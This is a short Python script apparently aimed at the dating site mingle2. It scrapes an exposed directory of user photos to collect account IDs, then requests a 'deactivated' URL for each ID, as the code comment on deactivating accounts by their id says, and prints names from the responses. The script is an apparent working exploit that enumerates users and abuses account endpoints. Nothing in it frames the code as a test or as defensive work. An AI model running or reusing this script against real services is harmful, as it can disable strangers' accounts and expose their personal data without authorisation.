from urllib import request,error
import re
from bs4 import BeautifulSoup

images_list = request.urlopen("https://assets.mingle2.com/images/users/35/76/")
user_id = []
pattern = re.compile(r'<a href="(\d+)_\d{4}.jpg">')

for image_link in images_list:
    image_link = str(image_link)
    result = pattern.search(image_link)
    if result is not None:
        user_id.append(result.group(1))

print("Numbers of user accounts:::::>>>>",len(user_id)+1)

        
# Deactivating account by their id.
for account in user_id:
        deactivate_acc = request.urlopen("https://mingle2.com/user/deactivated/%s" %account)
        html = BeautifulSoup(deactivate_acc)
        acc_name = html.find(attrs={'class':'next'})
        print(acc_name.text)


    
